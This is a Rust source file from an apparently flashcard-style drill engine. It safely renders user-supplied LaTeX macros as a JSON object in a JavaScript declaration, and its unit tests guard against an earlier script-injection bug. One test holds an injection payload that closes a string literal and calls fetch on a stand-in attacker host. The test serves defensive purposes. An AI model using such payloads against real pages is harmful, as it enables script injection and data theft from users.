// Copyright 2025 Fernando Borretti
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Small pieces shared by the drill engine and the pages that embed it.

use std::fmt::Display;
use std::fmt::Formatter;

use serde_json::Map;
use serde_json::Value;

/// Which rating buttons a card's answer shows.
///
/// Set per deployment by `[defaults].answer_controls` in the config file.
#[derive(Clone, Copy, PartialEq)]
pub enum AnswerControls {
    /// Show all four rating buttons (Forgot/Hard/Good/Easy).
    Full,
    /// Show only two rating buttons (Forgot/Good).
    Binary,
}

impl Display for AnswerControls {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            AnswerControls::Full => write!(f, "full"),
            AnswerControls::Binary => write!(f, "binary"),
        }
    }
}

/// Render the `MACROS` declaration prepended to a collection's `script.js`.
///
/// Macro names and definitions come from a collection's `macros.tex`, so
/// they are user input. They are emitted as a JSON object literal — JSON
/// is a subset of JavaScript expression syntax — rather than pasted into
/// hand-quoted string literals: an apostrophe in a definition (`\text{don't}`)
/// used to close the literal early, which broke the whole script and let a
/// crafted definition inject arbitrary JavaScript into the page.
pub fn render_macros_declaration(macros: &[(String, String)]) -> String {
    let map: Map<String, Value> = macros
        .iter()
        .map(|(name, definition)| (name.clone(), Value::String(definition.clone())))
        .collect();
    format!("let MACROS = {};\n", Value::Object(map))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_answer_controls_display() {
        assert_eq!(AnswerControls::Full.to_string(), "full");
        assert_eq!(AnswerControls::Binary.to_string(), "binary");
    }

    /// The declaration must be a single JavaScript statement whose right-hand
    /// side parses as JSON, whatever the macros contain.
    fn parse_declaration(rendered: &str) -> Value {
        let body = rendered
            .strip_prefix("let MACROS = ")
            .and_then(|s| s.strip_suffix(";\n"))
            .expect("the declaration must be `let MACROS = <object>;`");
        serde_json::from_str(body).expect("the right-hand side must be valid JSON")
    }

    #[test]
    fn test_render_macros_declaration_is_empty_object_for_no_macros() {
        assert_eq!(render_macros_declaration(&[]), "let MACROS = {};\n");
    }

    #[test]
    fn test_render_macros_declaration_preserves_backslashes() {
        let macros = vec![(r"\R".to_string(), r"\mathbb{R}".to_string())];
        let value = parse_declaration(&render_macros_declaration(&macros));
        assert_eq!(value[r"\R"], Value::String(r"\mathbb{R}".to_string()));
    }

    /// An apostrophe in a definition used to close the single-quoted literal
    /// the macro was pasted into, breaking every script on the page.
    #[test]
    fn test_render_macros_declaration_survives_apostrophes() {
        let macros = vec![(r"\dont".to_string(), r"\text{don't}".to_string())];
        let rendered = render_macros_declaration(&macros);
        let value = parse_declaration(&rendered);
        assert_eq!(value[r"\dont"], Value::String(r"\text{don't}".to_string()));
    }

    /// A definition can otherwise close the declaration and append statements
    /// of its own.
    #[test]
    fn test_render_macros_declaration_survives_injection_attempt() {
        let macros = vec![(
            r"\x".to_string(),
            "'; fetch('https://evil.example'); //".to_string(),
        )];
        let rendered = render_macros_declaration(&macros);
        let value = parse_declaration(&rendered);
        assert_eq!(
            value[r"\x"],
            Value::String("'; fetch('https://evil.example'); //".to_string())
        );
    }

    #[test]
    fn test_render_macros_declaration_escapes_quotes_and_newlines() {
        let macros = vec![(r"\q".to_string(), "a\"b\nc".to_string())];
        let rendered = render_macros_declaration(&macros);
        assert_eq!(rendered.lines().count(), 1, "the declaration is one line");
        let value = parse_declaration(&rendered);
        assert_eq!(value[r"\q"], Value::String("a\"b\nc".to_string()));
    }
}
